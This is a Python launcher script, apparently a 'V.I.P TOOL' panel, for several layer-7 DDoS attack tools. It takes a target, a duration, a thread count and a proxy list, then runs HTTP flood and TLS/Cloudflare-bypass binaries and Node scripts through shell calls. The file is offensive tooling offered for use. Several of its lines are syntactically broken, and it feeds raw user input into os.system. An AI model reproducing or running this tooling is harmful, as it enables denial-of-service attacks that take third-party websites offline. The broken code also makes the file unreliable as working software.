
import subprocess
import os
from os import name, system

if name == 'nt':
    system("title V.I.P TOOL")
    system("mode 101, 30")

# Hàm để chạy các lệnh shell khởi động script nodejs
def run_script(script_name, args):
    command = ['node', script_name] + args
    subprocess.run(command)

# Đếm số proxy trong tệp
def count_proxy(proxy_file):
    with open(proxy_file, 'r') as file:
        proxies = file.readlines()
    # Loại bỏ dòng trắng và các dòng chỉ chứa khoảng trắng
    proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
    return len(proxies)

# Hiển thị menu chọn script
def show_menu():
    os.system("cls" if os.name == "nt" else "clear")
    print()
    
    print(" Created By @hyiptotop")
    
    print()
    print("============= Method layer 7 ============")
    print("  ==> Golang")
    print("  [1] - HTTPdestroy")
    print("  [2] - StresserUS")
    print("  ==> Nodejs")
    print("  [3] - HTTP2")
    print("  [4] - CF-TLS")
    print("  [5] - CFS")
    print("  [6] - TLS-BYPASS")
    print("  [7] - TLS-kill")
    print("  [0] - Exit")
    print("=========================================")

# Xử lý lựa chọn script từ người dùng
def handle_menu_selection(selection):
    if selection == '1':
        print("\n============== HTTPdestroy ==============")
        target = input("  Target: ")
        time = input("  Time: ")
        requests = input("  Requests per IP: ")
        thread = input("  Thread: ")
        proxy_file = input("  File proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("============== HTTPdestroy ==============")
        print(f"  Details Attack")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  Attack (Enter)\n")
        os.system(f"chmod 777 httpdestroy")
        proxy_count = count_proxy(proxy_file)
        print(f"  Proxy Not Found: {proxy_count}")
        os.system(f"./httpdestroy {target} {time} {requests} {thread} {proxy_file}")

    elif selection == '2':
        print("\n=============== StresserUS ==============")
        target = input("  Target: ")
        limit = input("  Rate limit: ")
        time = input("  Time: ")
        proxy_file = input("  File proxy: ")
        thread = input("  Thread: ")
        mode = input("  ode: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("=============== StresserUS ==============")
        print(f"  Target Attack")
        print(f"  Target: {target}")
        print(f"  Rate limit: {limit}")
        print(f"  Time: {time}")
        print(f"  Proxyfile: {proxy_file}")
        print(f"  Thread: {thread}")
        print(f"  Mode: {mode}")
        print("=========================================")
        input("  Attack (Enter)\n")
        os.system(f"chmod +x StresserUS")
        proxy_count = count_proxy(proxy_file)
        print(f"  Proxy Found: {proxy_count}")
        os.system(f"./StresserUS version=2 host={target} limit={limit} time={time} list={proxy_file} threads={thread} mode={mode}")
#./StresserUS version=2 host=<url> limit=<rate> time=<time> list=<proxyfile> threads=<thread> mode=<GET/POST> cookie=<ddos=true> data=<post=true>

    elif selection == '3':
        print("\n================= HTTP2 =================")
        target = input("  Target: ")
        time = input("  Time: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================= HTTP2 =================")
        print(f"  Details Attack")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print()
        print(f"  Details Default)
        print(f"  Proxyfile: proxy.txt")
        print(f"  Uafile: ua.txt")
        print("=========================================")
        input("  ttack (Enter)\n")
        proxy_file = "proxy.txt"
        proxy_count = count_proxy(proxy_file)
        print(f"  Proxy Found" {proxy_count}")
        run_script('HTTP2.js', [target, time])

    elif selection == '4':
        print("\n================= CF-TLS ================")
        target = input("  Target: ")
        time = input("  Time: ")
        thread = input("  Thread: ")
        proxy_file = input("  File proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================= CF-TLS ================")
        print(f"  Details Attack")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  Attack (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  Proxy Found: {proxy_count}")     
        run_script('CF-TLS.js', [target, time, thread, proxy_file])

    elif selection == '5':
        print("\n================== CFS ==================")
        target = input("  Target: ")
        time = input("  Time: ")
        thread = input("  Thread: ")
        mode = input("  Mode: ")
        proxy_file = input("  File proxy: ")
        requests = input("  Requests per IP: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================== CFS ==================")
        print(f"  Details Attack")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Thread: {thread}")
        print(f"  Mode: {mode}")
        print(f"  Proxyfile: {proxy_file}")
        print(f"  Requests per IP: {requests}")
        print("=========================================")
        input("  Attack (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  Proxy FOUND: {proxy_count}")
        print(f"\n  Attack")
        print(f"  Creatd By @hyiptotop\n")
        run_script('CFS.js', [target, time, thread, mode, proxy_file, requests])

    elif selection == '6':
        print("\n=============== TLS-BYPASS ==============")
        target = input("  Target: ")
        time = input("  Time: ")
        thread = input("  Thread: ")
        proxy_file = input("  File proxy: ")
        requests = input("  Requests per IP: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("=============== TLS-BYPASS ==============")
        print(f"  Details Attack")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Thread: {thread}")
        print(f"  Proxy file: {proxy_file}")
        print(f"  Requests per IP: {requests}")
        print("=========================================")
        input("  Attack (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  Proxy Found: {proxy_count}")
        print(f"\n  Attack")
        print(f"  Created By @hyiptotop\n")
        run_script('TLS-BYPASS.js', [target, time, thread, proxy_file, requests])

    elif selection == '7':
        print("\n================ TLS-kill ===============")
        target = input("  Target: ")
        thread = input("  Thread: ")
        requests = input("  Requests per IP: ")
        mode = input("  Mode: ")
        time = input("  ime: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================ TLS-kill ================")
        print(f"  Details Attack")
        print(f"  Target: {target}")
        print(f"  Thread: {thread}")
        print(f"  Requests per IP: {requests}")
        print(f"  Mode: {mode}")
        print(f"  Time: {time}")
        print()
        print(f"  Default Details")
        print(f"  Proxyfile: http.txt")
        print(f"  Uafile: ua.txt")
        print("==========================================")
        input("  Attack (Enter)\n")
        proxy_file = "http.txt"
        proxy_count = count_proxy(proxy_file)
        print(f"  Proxy Found {proxy_count}")
        print(f"\n  Attacking")
        print(f"  Created By @hyiptotop\n")
        run_script('TLS-kill.js', [target, thread, requests, mode, time])

    else:
        print("  ")

# Khởi động panel
def start_panel():
    while True:
        show_menu()
        selection = input("  Select (0-7): ")
        
        if selection == '0':
            break
        
        if selection not in ['1', '2', '3', '4', '5', '6', '7']:
            print("  Invaild")
            continue
        
        handle_menu_selection(selection)

# Bắt đầu chạy panel
start_panel()
